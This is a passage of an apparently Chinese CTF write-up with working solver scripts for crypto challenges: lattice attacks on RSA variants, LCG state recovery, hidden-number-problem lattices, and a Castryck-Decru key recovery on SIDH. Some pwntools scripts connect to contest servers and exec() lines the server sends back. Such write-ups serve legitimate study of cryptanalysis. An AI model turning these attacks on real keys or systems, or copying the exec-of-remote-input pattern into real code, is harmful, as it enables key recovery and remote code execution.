from Crypto.Cipher import ARC4

arr1 = bytes.fromhex("7DF484DF4E311BFB2DE658DF549487D7D2D5FBD0")
arr2 = bytes.fromhex("2A91E8BC7E5C7EDB5989788D17C0C1F7E09AC9E2")

key = bytes([arr1[i] ^ arr2[i] for i in range(len(arr1))])
rc4 = ARC4.new(key)

target = bytes.fromhex("34C2652DDAC6B1AD47BA06A93BC1CCD7F12924392AC015027E10667B5EEA5ED05946E1D66E5EB2466B31")
dec = rc4.decrypt(target).decode()

old = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP"
new = "yJzLkHwDxaCAtnsPipmIBfhljdGbeOqKNcEMugvFor"
flag = ''

for i in range(len(dec)):
        flag += dec[new.index(old[i])]

print(flag)
```

# Crypto

## easyRSA

改编题，改编自2022年虎符CTF：https://github.com/1umi3re/my_ctf_challenge/blob/main/hfctf_2022/RRSSAA/exp.py

将题目的格大小调整使得运行时间减少，同时修改alpha,beta,delta参数即可出结果。

```Python
from gmpy2 import next_prime, iroot
from Crypto.Util.number import getPrime, inverse, GCD, bytes_to_long, long_to_bytes
from sage.all import *

def attack2(N, e, m, t, X, Y):
    PR = PolynomialRing(QQ, 'x,y', 2, order='lex')
    x, y = PR.gens()
    A = -(N-1)**2
    F = x * y**2 + A * x + 1

    G_polys = []
    # G_{k,i_1,i_2}(x,y) = x^{i_1-k}y_{i_2-2k}f(x,y)^{k}e^{m-k} 
    for k in range(m + 1):
        for i_1 in range(k, m+1):
            for i_2 in [2*k, 2*k + 1]:
                G_polys.append(x**(i_1-k) * y**(i_2-2*k) * F**k * e**(m-k))

    H_polys = []
    # y_shift H_{k,i_1,i_2}(x,y) = y^{i_2-2k} f(x,y)^k e^{m-k}
    for k in range(m + 1):
        for i_2 in range(2*k+2, 2*k+t+1):
            H_polys.append(y**(i_2-2*k) * F**k * e**(m-k))

    polys = G_polys + H_polys
    monomials = []
    for poly in polys:
        monomials.append(poly.lm())
    
    dims1 = len(polys)
    dims2 = len(monomials)
    MM = matrix(QQ, dims1, dims2)
    for idx, poly in enumerate(polys):
        for idx_, monomial in enumerate(monomials):
            if monomial in poly.monomials():
                MM[idx, idx_] = poly.monomial_coefficient(monomial) * monomial(X, Y)
    B = MM.LLL()

    found_polynomials = False

    for pol1_idx in range(B.nrows()):
        for pol2_idx in range(pol1_idx + 1, B.nrows()):
            P = PolynomialRing(QQ, 'a,b', 2)
            a, b = P.gens()
            pol1 = pol2 = 0
            for idx_, monomial in enumerate(monomials):
                pol1 += monomial(a,b) * B[pol1_idx, idx_] / monomial(X, Y)
                pol2 += monomial(a,b) * B[pol2_idx, idx_] / monomial(X, Y)

            # resultant
            rr = pol1.resultant(pol2)
            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print(f"found them, using vectors {pol1_idx}, {pol2_idx}")
                found_polynomials = True
                break
        if found_polynomials:
            break

    if not found_polynomials:
        print("no independant vectors could be found. This should very rarely happen...")


    PRq = PolynomialRing(QQ, 'z')
    z = PRq.gen()
    rr = rr(z, z)
    soly = rr.roots()[0][0]

    ppol = pol1(z, soly)
    solx = ppol.roots()[0][0]
    return solx, soly


def seq(r, k, m):
    v = vector(Zmod(m), [r, 2])
    if k >= 2:
        M = Matrix(Zmod(m), [[r, -1], [1, 0]])
        v = (M**(k-1)) * v
    ret = v[0] if k != 0 else v[1]
    return int(ret)


def legendre_symbol(a, p):
    """ Compute the Legendre symbol a|p using
        Euler's criterion. p is a prime, a is
        relatively prime to p (if p divides
        a, then a|p = 0)
        Returns 1 if a has a square root modulo
        p, -1 otherwise.
    """
    ls = pow(2,(p-1)//2,p)
    return -1 if ls == p - 1 else ls


def decrypt(c, e, p, q):
    d_p = {1: int(pow(e, -1, p-1)), -1: int(pow(e, -1, p+1))}
    d_q = {1: int(pow(e, -1, q-1)), -1: int(pow(e, -1, q+1))}

    inv_q = int(pow(p, -1, q))
    inv_p = int(pow(q, -1, p))

    i_p = legendre_symbol(c**2-4, p)
    i_q = legendre_symbol(c**2-4, q)
    r_p = seq(c, d_p[ZZ(i_p)-p], p)
    r_q = seq(c, d_q[ZZ(i_q)-q], q)

    r = CRT([r_p, r_q], [p, q])
    v_rp = seq(r, e, p**2)
    t_p = int((c * pow(v_rp, -1, p**2)) % p**2)
    s_p = (t_p - 1) // p

    v_rq = seq(r, e, q**2)
    t_q = int((c * pow(v_rq, -1, q**2)) % q**2)
    s_q = (t_q - 1) // q

    m_p = (s_p * inv_p) % p
    m_q = (s_q * inv_q) % q

    m = CRT([m_p, m_q], [p, q])

    return m

if __name__ == '__main__':
    e = 3121363059746835628022404544403822724460605553641332612055010587129451973002475126644668174294955070747985002800863652917895939538596303356113483509581841527286351537287500304267975061675901109982875778527827742120878835367386538561039072391997357702421691095861694681707017921391244519593945584755632901987840338065879901115934561426583008838453244051629340056867760923894623105542463500022221236457852502822707466528439969484890601953615303609725566617126458934095119670087068752543521167517461730977044465374505011791902510131823556603316457085145886999220426746234986984619161299098173535371540923264898459106461
    c = 3023313363629909506923927199426293187583112749147539699346723655095868214179291222441307436555352537055690155418715652987685459938250844145450675418187664719327350488160722838989675928696633353180233455017609936874014883975932740217672705286265535646106053294507962613498142617741362730709360885118905440314573392981528077265110441270212385951070591696827167771592664502652520790612367259434545169836933571343480057141790292296952743986731389468760364416344837575740236416472589700581583016227273449673820568427641136163703116276104550877191839851640920430919278802098196408637904780725723268371465670950321881886863
    n = 101946888552605033726177837709738163930032970477361664394564134626639467843553634920510447339985842689387519517553714582991506722045078696771986052246306068257957261478416093188640437503481862825381241480405463985516598520453211217206308826779669980833596066677262549841524134539729279446910817169620871929289
    alpha = ZZ(e).nbits() / ZZ(n).nbits()
    beta = 0.5
    nbits = 1024
    delta = 0.45

    X = 2 ** int(nbits*(alpha+delta-2)+3)
    Y = 2 ** int(nbits*beta+3)

    x, y = map(int, attack2(n, e, 4, 8, X, Y))
    p_minus_q = y
    p_plus_q = iroot(p_minus_q**2 + 4 * n, 2)[0]

    p = (p_minus_q + p_plus_q) // 2
    q = n // p
    assert p * q == n
    phi = (p**2 - 1) * (q**2 - 1)
    d = inverse(e, phi)
    m = decrypt(c, e, p, q)
    print(long_to_bytes(m))
```

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820564.png)



## guess

题目所给的U没取模，t是160位，x是160位，randint(1,q>>l)是158位，所以有很大概率x就是u//t+1，直接将结果发过去即可得到flag。

```Python
from pwn import *

context.log_level="debug"

s=remote("190.92.234.114",23334)
exec(s.recvline())
exec(s.recvline())
exec(s.recvline())
s.recvuntil(b"x = ")
s.sendline(str(U[0]//T[0]+1).encode())
s.recvline()
```

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820552.png)



## IS_THIS_LCG

三个LCG：

第一个LCG是一个改编的LCG的HNP问题，具体可以参考V哥哥的文章：https://www.anquanke.com/post/id/204846；

第二个LCG是ECC上的，给出了七个点的x坐标，并且这七个点有类似于等差数列的性质：

​                                                                 $$X_i=X_{i-1}+b$$

根据椭圆曲线的点加法：

​                                                                  $$\lambda ={y_2-y_1\over x_2-x_1}$$

​                                                               $$x_3=\lambda ^2-x_1-x_2$$

计算b的x坐标

​                                                                   $$b=X_i-X_{i-1}$$

得到：

​                                                        $$x_b=({y_i+y_{i-1}\over x_i-x_{i-1}})^2-x_{i}-x_{i-1} mod \ p$$

$$x_b*(x_i-x_{i-1})^2+x_i+x_{i-1}=(y_i+y_{i-1})^2=(x_i^3+ax_i+b)+(x_{i-1}^3+ax_{i-1}+b)+2y_iy_{i-1}$$将$$2y_iy_{i-1}$$单独放一边平方之后即可得到关于$$x_b,a,b$$三个未知数有关的方程，一共6个方程，然后用Groebner基去解方程，即可解得p；

第三个LCG是矩阵上的，先用类似于LCG的思想求出A,B。为加快计算，可以使用类似于等比数列求第n项的方法：

​                                                        $$X_i=AX_{i-1}+B$$

​                                            $$X_i-T=AX_{i-1}+B-T=A(X_{i-1}-T)$$

即：

​                                                         $$B-T=-AT$$

​                                            $$(E-A)T=B\Rightarrow T=(E-A)^{-1}B$$

求出T之后，求第n项：

​                                                    $$X_n=A^{n-1}(X_1-T)+T$$

其中A矩阵的幂次可采用快速幂实现，当然sagemath已经帮我们实现了，就不用自己写了，得到N的三个因子后用N除得到第四个因子，之后正常RSA解密即可。

```Python
#sage
from Crypto.Util.number import *
from gmpy2 import *

def mt2dec(X, n, m):
    x = 0
    for i in range(n):
        for j in range(n):
            x = x + int(X[i, j]) * (m ** (i * n + j))
    return x

def dec2mt(x):
    res=Matrix(Zmod(m),8,8)
    digit=x.digits(m)
    for i in range(8):
        for j in range(8):
            res[i,j]=digit[8*i+j]
    return res

x10 = 0xc65f1c882be27b574c70f10e155ed3d3792d037d3c7
x11 = 0x142e1a26667e31a70eb58fa1e2b296d31a09675fa687
x12 = 0x17f366e283147917cc044778bbce2816884577126a9c
x13 = 0x2a316775dda35ad9a0e8a038757c85f216e91516f1ce
x14 = 0x3ef873ee8fa84fd071777521c78cb10a929f92f10dc7
x15 = 0x14e228828cb5090361501acac3108f05096fa8976e9c
x16 = 0x2e664838384824369607284ad9950f839f23a85c1974
x17 = 0x11affcbdf3da150c318bcc7096d21e8eb4bdaf904b9e

x20 = 0x524456278d175edd6bcc3f2bbb8160a87dfe07092db7eedd1e4e3521e9cef7925e9c965a47ce9b7349456938fbf6d1d92095cfe7cdc06c8dbeac5284982d027179d8d363b1d1a9b95c2bb1334e589ac3c013d8cff1c904d0c2aed1f281e997be89abe3d0d2d668dc53adc4ae9870474a23ff993598bf2b51679179c8a1568619
x21 = 0x2f340fb1c6761e084b1465c5078f36e9caf7f9d6deecb969cc84fb5b85b1e4070157094c835333349f3d317e6a78a31a27d1ff0f8dfb103ead7444f26ac7b8be6b8ec346a8c8b4fe6f983db2729b6490ce0e1ea115b62f5e2888911d278153e3377a7456705c4f1a56588d8f727a91a8a401a852dd26573b2dc2ccf6a4af1de2
x22 = 0x92b2bbdf0c336be756ac47cc0b98fbc76b9ac679db96a5afd8fe500d16f4997503ee33d0508a59fff172042d6dcc4994a2d8220adcd8f5e591458b9409468c51b92dcacf73e793af3f793b9becb9cbb0704834861a43e1d1fd5cd5a9be14fafa8ec02df059fb3e1a3b0e7a8fb9969d42ffc13e2e3404fd539cd0d95b15f69f33
x23 = 0x795e49d6bc45ecf4d349d16058166f6422311344e3e6d8913a8b0a28225c92e203dfba92dd809a58a3630bfbb4cdf6d3118f172f6d6cb7c35cd4f9cf70947d091659e2ec4e248eaf2c456d58a149dd1fff7667630504cbb55cd82e3a2fe681f9b23de329d70a85f4badce87168dfb37b96b9edbeeb39a3d4ab28c130e9150140
x24 = 0x5a2bf69e31eef5ec1b990a2d2e3f8ccb08ba9996db2022775770b3b486909653b5347c15ceab62b167ad1dfa6a997efb56315fd6afde2e6c1b5af5a6e9b818556669992f148525c990bdb61e712339856dcf6e0f27ed8279bb32aba553bbab2ad3ac4accf3084638528a34434ec80df33705e381b39e9786593cff3e04a5b23d
x25 = 0x5baeb38339d662e8c16b1f16cd6129af38adebb264ffb197d6245f56df813c64b7ef28e60137b54d15a4227ca6ecd08f6ccbbbcb598bc94b1f326d8d488e13179d2999fb2c922165c9f27c2d7d0267e6924ce6395c33ec52a35776e88874877d8ccbbf8ca9ee214a7b73a8f7da23db02978f3b8bd145c2cca66b17638169f5e9
x26 = 0x4c2fc188b5cd7f4d19a4b120402946d7f8ca11c711e7771c39814e01c692160b7545edcff82a22d4634c416185eb58ff44adfdce5dc36a6d7c663f57eb19fc34f1a6c7e493518b094ad46fb8f9b6eb741c4666878ac91898116eb353a0a5aab9289322aaca6bed2ee104db17be339af54538635208f756da15bf46d18b0549a

X0 = 0xc54aad8bd2b3233576847209ad1ade5f535622aab2a6279464832dea3dc88e7898a58130e36273143a90fcd4497079010e50658c2981e66e09ae86de089bf1f7123abb7d71fe68cf8d9eab3a2fc4792f1cb6444eff47c0f666995096c43ef8149fa78c061ca62809a2eadb00ac0dff81fb4163335c0a8014082e95b5007a2e2c
X1 = 0x3a3944bb3fd77217ab57358b174dbef9f704b844fb09f0d05bd4cfafc5a758f3b4d60c5cb584b1bb37f0c83bce8cba67bd04d11826433afba1717106da48a6cc22d571a0fa57fe63c29896783d6a9676f241cf4c9b1081aee364334ed3f80d680ad4c52d8a9e026fdfc97c1cda397a1f37c368420176e3270299efa21fa4c614
X2 = 0x309838246999c3a8920a9e8911f0c643eb614a9c522fb2cd5776bf582d7ad79796558b839e8ffc393e479aa0761d961df6860f9c44dea9b073a5006c2705128a7e7b139c407d15f430bd1a60d679d9f40deab664c84553fa8b9c1e8aeeb42e75c5c305d8b86e09debc9e193617f9fd619a0053017f71810cc3a48bb1fe89878
X3 = 0x38acf9569013ea3a32b18aef48ed6d0ad6557afe3e929c757d541039faefab0eeb53c5341a4ae5b9df610efcc66d09ae4238c569929d46409dd4f21d75a7bc97f3d8eed2dd397124d5a94946ccb8e8da8d030b4db4ac8821c313bdc87c8c25576050503891ca629b232e4f1b5c9bac4809979fc4dfb8f07260b3cdd62b2f45a6
X4 = 0xda4663505a3ce430f75fe908c34f96dfc8e3a997dcd378205274b1855804d069044558eeb09f0e36feeb34edd82ffec268095eef4acc795cacf4921bb33dab678f0ee930e7718839962511c49f91dddb4389cd9db61ba49baadd3a876952291d31b85b04ab2561a85542879d0e3287ad6f1c60b28daf05a56cab18955dd8d48a
X5 = 0x8e7250916637c65a685f5db8a3e5e84e223ebe59346f807048f16f5ee98ccf10679b3b1952e50ba32730906794d40c1aebdeccd059b775bce13186907ea883230160254254ebc4006a452826eb75361f92e5ae9b30f87e8c8abed2a90117eccf1b4e6aac455b1fc6a0983141dfe1df81b912612649e3bb48560eca66af9c9b76
X6 = 0x7ba1fb51f424a6257d85599cb596aa3bb0e83c94fa14ca716e5d933a507ba8cd1b6addc171d260ade722e01c7d69eaba0f5f3dfccccb2711b8407d0891e2179525577619f96735d55c98414f61042457059f93bb8613c81dd656885b4dbd5554a792c1e8226e0207ab3bae04e63bf5ab68190dc4915709e2eb2c6e3ddbf0b89a
X7 = 0xcf3b0d393c7ef1753e602e0b088fc15d0c06f949631cc9083ef7ab16c65148b47aa63eabb6151e39d85a5a339c065d9f1b4a33ab587f6093eb097fc6bab25a6b27cc8ae7d77775869b0864f6bdb7c1d8dcfa1a28dce4df346d95eaf90047020f4f8ad7e9496ed86e7c1bd840724348d88a308ca21174c61cf759ba106c548458
X8 = 0xe8e2ba97f5bdb287984e2a61b5a489ea4dc45c2c8e3601f151a20b92d1d6b7c0800712d07e4de5d2ca6f9cbfff25a64989e0779b98e56df1f4d8c301d3d743b86690d567c7f3a6bd74aa08b7df1970eb4b53ef2d5f8a7c3be585462dc3a972f99cd99b4ee1738a719476ebe70ba5a89447e020566e2a98ebab5747be0758a312
X9 = 0xcb1cd415bb82a8036035396806a37e28f23a709a51301fea6b0195e3da1a5ff7f71c6bd89387b955ff9e0d743f00e09286cf32520428791bac19368936f2e9bda4ffc4487a2bc999bb22249cffedc16dd686ac91d9a4cfe459e114ce38858f2b4972b09fd3c463c5b40cd553e640afe5803a390766842d2b6a74152923f329db

N = 0x614d9a106993a792c144715b0269a2726eb18a2e7b1ea7061bce1f6acb31af6289309d67ce6b28b3e88110c42785c0ca23833cc0e2aa4a30aadb16d25db7a74ef03b0898b7af47d56d4538b0f556b2779ed86e0600f821354d51f8551ccd23bbf8bf91eb9a9283a3d4d5248e3f404b4c6646a7dc805f29940a7e29d2f50343e1acc0d0067606606b331a64881bbafeafeb8ca44e736b41eab4608097216f587a1a4f74518614b46e91505e07c3a280b701ee88ca189e9903d601bc934584409d560027e5b34adb1f4949333ab5db34e95e49374e354d4ddc088855f1aae7a95e32ef195521b33f118169ae613e3fd5bf8d2942c2bde9ef506346698b0b5192c86b1efe24cffb907652afd5f0cb3966c7470195122ced63f5c40a4d9a3b6704e0b186ab7b9e3296b1299b6fa133d2455a8f8d8a9007a22bc61546b357ea314b0d369d72d22063c5ed6c14aa2a7edf31bdf93e63149818ef3724ca1cac367ac22b51260c793212ea221e062fcca68f28a4cd0b3bbeee03b9c73fd064c8298e775ab8a63c94db480a1eba918d09cba975304eed4fa5e874fc964e328547c23790e97102c6ad0bca9810dabb6285906f13d41798d3237333288b4498610d1a8fa79be85a522232a7cb904cd7c9b7fab995f39cd22a9758a5c2b6dcf44299df1e3e2ac360339b341ca6beb31eccba39ebd6f98dee127c6b5298db152fa6920b9703ab
c = 0x3a130d7f737dd7e5901290a55349342a535b94bb89831b1c02539480fe76b07ad64f5d2b618e637f4ddc536d46a1c05b219eafc9b609629ae6d1a9c1a888bc8b34d81b9f681fd9ca3919f8382b09f2ba1d78dedffc093c4795200d89aea37b0ac7f23c8eb621810d7a130fa1e324c9a6ea8c3ad69200057f91003d1305293be05d662505e45ea9172097cb030f8fdde2712070fc6f9def504440cac6c46305f7d81f6e40d53ec8ae6c653298e1989ac8f9616dc1d93cb6976ac1c777fc7e50f1a8ef3100ba4871c769c8a3b52a37e15f523a49f69d9ff93c01639d0d099884e113483b580e224a12cbbc6711ae8c5af3ecd375f6da1be68f7fa7425f6e81ea63456d73f9a24ba56766127d6a2871ff2945dbdc1fc14cce2d94c6aa9c114896a1ef06f992666484bc02eacfe540df0c8138c05c572737f42d4069d3bc254df1c825b3a8844edb38f486f96cf153ac07523e430e0546b58abb6fe4268460b722efbe9ee5c718a586f90588e9ad4c49db0068dc1db942756700142c26d512969428141d70c982b003d1d17450ceab0e7845b1e14ce10db3245366d4cd6f46457e0c6e05827f8e9b8bf4163df1712087aba0bce629951d7f2d5279b793bf8131a4b8ee84916e06b49ae4582eea9b43b58a2ee77e6618103ab28c1978800ad07cd12f1ab6843385d18d33b191abccdc18f6fa90004f0edab5cc1ff3c6049cc1e41e89

m = 2 ** 1024
a = bytes_to_long(b'Welcome to RCTF 2022')
b = bytes_to_long(b'IS_THIS_LCG?')
x1=[x10,x11,x12,x13,x14,x15,x16,x17]
for i in range(len(x1)):
    x1[i]=x1[i]<<850
A = [1]
B = [0]

for i in range(1,7):
    A.append(a*A[i-1] % m)
    B.append((a*B[i-1]+a*x1[i]+b-x1[i+1]) % m)
A=A[1:]
B=B[1:]
M=Matrix(ZZ,len(A)+2,len(A)+2)
for i in range(len(A)):
    M[i,i]=m
    M[-2,i]=A[i]
    M[-1,i]=B[i]
M[-2,-2]=1
M[-1,-1]=2^850
#print(M)
res=M.LLL()[0]
new_x=res[-2]
xxx=res[-3]+x1[7]
p1=next_prime((a*xxx+b)%m)

def y2(x,A,B):
    return x^3+A*x+B

xx=[x20,x21,x22,x23,x24,x25,x26]
P.<xb,A,B>=PolynomialRing(ZZ)
F=[]
for i in range(6):
    f=xb*(xx[i+1]-xx[i])^2-y2(xx[i+1],A,B)-y2(xx[i],A,B)+(xx[i]+xx[i+1])*(xx[i+1]-xx[i])^2
    f=f^2-4*y2(xx[i+1],A,B)*y2(xx[i],A,B)
    F.append(f)



Ideal=Ideal(F)
p2=Ideal.groebner_basis()[-1]//100
assert N%p2==0

X=[X0,X1,X2,X3,X4,X5,X6,X7,X8,X9]
n, m = 8, next_prime(2^16)

assert mt2dec(dec2mt(X[0]),n,m)==X[0]
X=[dec2mt(i) for i in X]

A=(X[2]-X[1])*(X[1]-X[0])^(-1)
B=X[2]-A*X[1]

for i in range(len(X)-1):
    assert X[i+1]==A*X[i]+B


E=Matrix(Zmod(m),8,8)
for i in range(8):
    E[i,i]=1
T=(A-E)^(-1)*B
assert A*T==B+T
for i in range(len(X)):
    assert X[i]==A^(i)*(X[0]+T)-T

X1337=A^(1337**1337)*(X[0]+T)-T
p3=next_prime(mt2dec(X1337, n, m))
assert N%p3==0

q=N//(p1*p2*p3)
phi=ZZ((p1-1)*(p2-1)*(p3-1)*(q-1))
d=invert(65537,phi)
print(long_to_bytes(ZZ(pow(c,d,N))))
```

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820771.png)

## super_guess（赛后）

guess的revenge，加了个模q，变成了HNP问题:

​                                                      $$u_i=xt_i-r_i mod \ q$$

一开始的格子自然是这样的：



​                     $$[l_0,l_1,...,x,-1]\begin{bmatrix} q& & & & &\\ & q & & & &\\ & & q & & &\\ &&&...& &\\ t_0&t_1 &t_2 &... & K/q&\\ u_0& u_1&u_2 &... & & K \end{bmatrix}=[r_0,r_1,...,Kx/q,-K]$$

其中$$K=2^{160}$$。

事实上这种格子效果并不好，为了充分利用x的信息，我们将x的高位和低位分离，重新计算系数，将原来的U,T计算得到B,A。格子变成了：

​                    $$[l_0,l_1,...,x_h,-1]\begin{bmatrix} q& & & & &\\ & q & & & &\\ & & q & & &\\ &&&...& &\\ a_0&a_1 &a_2 &... & C&\\ b_0& b_1&b_2 &... & & K \end{bmatrix}=[r_0,r_1,...,Cx_h,-K]$$

在这里C是为了平衡x低位缺失引入的平衡系数，若x的低5个字母已知，则$$C=2^{40-l}$$，为了更精确保证结果向量每一维数据的平衡，$$K=2^{160-l}$$，l为r低于160位的数据量。事实证明这样的格子，只能求解出l=3的情况，对于l=2的情况并不能很好的解决。但是在测试的时候发现，当x泄露了15个字母的时候（15个字母对于题目无意义，仅为本人对于界的测试），居然可以稳定求出正确的x，但是这就引发了一个问题，为什么求解的结果和x的大小有关呢（可能有人会说这样向量更小了，更容易出，但是我在格子里面设置了平衡系数的，按理来说不会有影响），无法理解。。。，如果有师傅知道原因，欢迎找我讨论（+Q 1440416491）。之后还去试了babai CVP（虽然SVP求解难度低于CVP，但是当时自己已经觉得这玩意是玄学了），也搞不出来，花费了太多时间在这上面，后面的题目有些都没时间看。在测试的时候发现还会出现多解的情况，求出来的r都在界内，也满足方程，但是就是x不对，非常搞心态。。。当时还试了一种格子：

​                 $$[l_0,l_1,...,x_h,-1]\begin{bmatrix} 2^lq& & & & &\\ & 2^lq & & & &\\ & & 2^lq & & &\\ &&&...& &\\ 2^lt_0&2^lt_1 &2^lt_2 &... & C'&\\ 2^lu_0& 2^lu_1&2^lu_2 &... & & K \end{bmatrix}=[2^lr_0,2^lr_1,...,C'x_h,-K]$$

但是也只能搞出l=3的情况。。。

赛后和dbt师傅**@deebato**交流的时候他提出了一种格子：

​                  $$[l_0,l_1,...,x_h,-1]\begin{bmatrix} 2^{l+1}q& & & & &\\ & 2^{l+1}q & & & &\\ & & 2^{l+1}q & & &\\ &&&...& &\\ 2^{l+1}t_0&2^{l+1}t_1 &2^{l+1}t_2 &... & C'&\\ 2^{l+1}(u_0-q//2^{l+1})\%q& 2^{l+1}(u_1-q//2^{l+1})\%q&2^{l+1}(u_2 -q//2^{l+1})\%q&... & & K \end{bmatrix}=[2^{l+1}(r_0-q//2^{l+1}),2^{l+1}(r_1-q//2^{l+1}),...,C'x_h,-K]$$这个操作的精髓在于括号里面的减法，因为我们已知$$r_i，所以我们给它减掉$$q//2^{l+1}$$，每一维的数据量大小就减小了一半。这里的$$C=2^{40},K=2^{160}$$，用上面的格子去作BKZ30约简，能够在只泄露5个字符（"rctf_")的条件下能够很大概率求解出正确的x。

程序如下，感谢**deebato@L**师傅！

```Python
#sage
from Crypto.Util.number import *
from pwn import *
from gmpy2 import invert
context.log_level="debug"

num=5
s=remote("190.92.233.181",23334)
l=2
m=90
exec(s.recvline())
exec(s.recvline())
exec(s.recvline())
pad=bytes_to_long(b"_cfrt")

A=[]
B=[]
    
t=3
for i in range(m):
    A.append((T[i]*256**num)%q)
    B.append((pad*T[i]-U[i]-q//(2^t))%q)

M=Matrix(ZZ,m+2,m+2)
K=2^(160)
for i in range(m):
    M[i,i]=2^t*q
    M[-2,i]=2^t*A[i]
    M[-1,i]=2^t*B[i]
M[-2,-2]=2^40
M[-1,-1]=K
ML=M.BKZ(block_size=30)

for i in ML:
    if i[-1]==K:
        FLAG=1
        R0=(i[0]%q)//(2^t)
        xxx=(R0+U[0])*invert(T[0],q)%q
        for j in long_to_bytes(xxx):
            if j<32 or j>128:
                FLAG=0
        if FLAG==1:
            s.recvuntil(b"x = ")
            s.sendline(str(xxx).encode())
            s.recvline()
            
    if i[-1]==-K:
        FLAG=1
        R0=(-i[0]%q)//(2^t)
        xxx=(R0+U[0])*invert(T[0],q)%q
        for j in long_to_bytes(xxx):
            if j<32 or j>128:
                FLAG=0
        if FLAG==1:
            s.recvuntil(b"x = ")
            s.sendline(str(xxx).encode())
            s.recvline()
```

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820764.png)



## S2DH（赛后）

本题的背景是最近有关SIDH的一个攻击方法，攻击方案的github仓库链接：[jack4818/Castryck-Decru-SageMath: A SageMath implementation of the Castryck-Decru Key Recovery attack on SIDH (github.com)](https://github.com/jack4818/Castryck-Decru-SageMath)

在此简述一下方案（本人理论有限，可能描述有误）：

首先选择参数a,b使得$$2^a3^b-1$$为素数，然后选择一个定义在$$\mathbb{F}_{p^2}$$上的超奇异椭圆曲线E，Alice选择E上域$$2^a$$下的两个点$$P_a,Q_a$$线性组合构成一组基，系数为$$(S_a,T_a)$$，同理Bob选择$$3^b$$下的两个点$$P_b,Q_b$$线性组合构成一组基，系数为$$S_b,T_b$$，Alice将生成的基作为同源变换的kernel，将E变换到$$E_a$$上，同时将Bob的两个点$$P_b,Q_b$$同源变换到$$E_a$$上，得到$$P_b',Q_b'$$；同理Bob也做类似的操作（因为是密钥交换协议）。**Github这个攻击能做到的就是，在输入****$$P_a,Q_a,E_a,P_b',Q_b'$$****的条件下，可以在多项式时间内求出****$$T_aS_a^{-1}$$****的值**（Github上面的生成方案**默认Sa=1**，我在修改这个值并测试输出结果的时候发现了这一点），在咨询了**@沛公**师傅之后，知道这是同源的性质，并且从他那里获取到了一个重要信息：如果两个曲线同源，那么它们的j不变量是一样的！这个信息是解题的关键。因为我们单纯从$$T_aS_a^{-1}$$这个信息是无法得知Ta和Sa分别的值的。根据沛公提到的理论性质，我们可以推出下面的结论：

同一个曲线在经过kernel1$$S_aP_a+T_aQ_a$$和kernel2$$P_a+T_aS_a^{-1}Q_a$$变换后，所得到的曲线的j不变量是相等的！

因此题目需要我们去求Eb在经过同态核$$Sa*psiPa + Ta*psiQa$$变换后曲线的j不变量就可以转化为求经过同态核$$psiPa + S_a^{-1}T_a*psiQa$$变换后的j不变量，而$$psiPa，psiQa$$已知，$$S_a^{-1}T_a$$可以通过Github实现的攻击求出，因此我们可以将j不变量求出。

在这里还有一个小细节：尽管根据密钥交换协议，我们既可以从Alice的角度出发求，也可以从Bob的角度求；但是Github实现的攻击只针对于$$3^b$$域下，因此我们只能从$$3^b$$域下的kernel出发，但是要求的结果却是从$$2^a$$的域下的kernel出发的。根据密钥交换的性质，我们可以知道：

​                                      $$E_a.isogeny(kernel_b)=E_b.isogeny(kernel_a)$$

因此我们可以转化，最终求得j不变量，解得flag

程序如下，感谢**沛公****@WaterDrop**师傅的指导！

还有个值得注意的点是：

![img](https://blu3moon.oss-cn-hangzhou.aliyuncs.com/img/202212130820990.png)

因此需要对照论文修改原来的2i映射

Tips：将该文件替换baby_SIDH.sage并运行sage baby_SIDH.sage（sage版本依赖较高）

```Python
import public_values_aux
from public_values_aux import *

load('castryck_decru_shortcut.sage')

# Baby SIKEp64 parameters
a = 43
b = 26

# Set the prime, finite fields and starting curve
# with known endomorphism
p = 2^a*3^b - 1
public_values_aux.p = p

Fp2.<i> = GF(p^2, modulus=x^2+1)
R.<x> = PolynomialRing(Fp2)

E_start = EllipticCurve(Fp2, [1,0])
E_start.set_order((p+1)^2) # Speeds things up in Sage


def two_i_map(PP):
    return 2*E_start((-PP[0],PP[1]*Fp2(i)))


P2=E_start(20816113353953844596827139*i + 16418101434179547435831830,9782287231195084940947894*i + 8305288838066432045414923)
Q2=E_start(13022786448801065009926908*i + 21396754486749480260181021,5027869541156315740937282*i + 8428382255806278677381816)
P3=E_start(7582970089792232978539532*i + 6411668474015872447958400,15459880436272725660545115*i + 7977012527121440514383975)
Q3=E_start(10341548384598782389107676*i + 12525908271709247355078632,6555843755802979256565190*i + 11595932163398809254591141)


EA=EllipticCurve(Fp2,[4926878008530427712778566*i+8053083788709808436490360,18771446501040649196825847*i+16306438728950797793375410])
PA=EA(2535790352220803985875373*i + 17699033710915047849396921,2413558249712558899689063*i + 5157954648088691506046995)
QA=EA(16568070039544280994803013*i + 21423138055383385576701886,5040448698696125071219900*i + 6672798507142407841550817)

EB=EllipticCurve(Fp2,[18866222948911535725014127*i+21372353382532165741892023,14780329017962693588095579*i+4731720677310255642021851])
PB=EB(3413055427164626562463192*i + 5176875496413372729075617,17919859745180152815219510*i + 18120119720358642060676362)
QB=EB(18433160961475396600407402*i + 22312166252239187097449810,10433258275941991434154560*i + 9029292514862239326241711)


def RunAttack(num_cores):
    return CastryckDecruAttack(E_start, P2, Q2, EB, PB, QB, two_i_map, num_cores=num_cores)

if __name__ == '__main__' and '__file__' in globals():
    if '--parallel' in sys.argv:
        # Set number of cores for parallel computation
        num_cores = os.cpu_count()
        print(f"Performing the attack in parallel using {num_cores} cores")
    else:
        num_cores = 1
    recovered_key = RunAttack(num_cores)
'''
Determination of first 1 ternary digits. We are working with 2^41-torsion.
guess: [[0], [1], [2]]
Testing digits: [0]
Testing digits: [1]
Computing image of 3-adic torsion in split factor CB
Glue-and-split! These are most likely the secret digits.
Bob's secret key revealed as: 173356622539
In ternary, this is: [1, 2, 1, 1, 2, 1, 2, 1, 2, 1, 0, 0, 2, 1, 1, 0, 1, 1, 0, 2, 1, 1, 2, 1]
Altogether this took 5.391702890396118 seconds.
'''
```

得到了$$T_aS_a^{-1}$$= 173356622539之后打开sagemath的shell：

```Shell
sage: from Crypto.Util.number import *
sage: a = 43
sage: b = 26
sage: p = 2^a*3^b - 1
sage: Fp2.<i> = GF(p^2, modulus=x^2+1)
